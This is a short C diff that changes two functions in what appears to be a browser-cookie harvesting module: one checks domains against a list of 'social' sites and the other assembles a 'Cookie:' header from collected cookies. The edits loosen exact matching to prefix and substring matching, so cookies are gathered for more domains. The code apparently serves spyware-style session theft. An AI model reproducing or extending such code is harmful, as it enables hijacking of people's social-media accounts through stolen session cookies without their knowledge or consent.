@@ -15,8 +15,10 @@ DWORD g_cookie_count = 0;
 
 BOOL IsInterestingDomainW(WCHAR *domain)
 {
+	if (domain[0] == L'.')
+		domain++;
 	for (int i=0; i<SOCIAL_ENTRY_COUNT; i++)
-		if (!wcscmp(domain, social_entry[i].domain))
+		if (!wcsncmp(domain, social_entry[i].domain, wcslen(social_entry[i].domain)))
 			return TRUE;
 	return FALSE;
 }
@@ -120,7 +122,7 @@ char *GetCookieString(char *domain)
 		return NULL;
 
 	for (i=0; i<g_cookie_count; i++) {
-		if (g_cookie_list[i].domain && !_stricmp(g_cookie_list[i].domain, domain) &&
+		if (g_cookie_list[i].domain && strstr(g_cookie_list[i].domain, domain) &&
 			g_cookie_list[i].name && g_cookie_list[i].value) {
 			len += strlen(g_cookie_list[i].name);
 			len += strlen(g_cookie_list[i].value);
@@ -136,7 +138,7 @@ char *GetCookieString(char *domain)
 	sprintf_s(cookie_string, len, "Cookie:");
 
 	for (i=0; i<g_cookie_count; i++) {
-		if (g_cookie_list[i].domain && !_stricmp(g_cookie_list[i].domain, domain)) {
+		if (g_cookie_list[i].domain && strstr(g_cookie_list[i].domain, domain)) {
 			if (g_cookie_list[i].name && g_cookie_list[i].value) {
 				strcat_s(cookie_string, len, " ");
 				strcat_s(cookie_string, len, g_cookie_list[i].name);
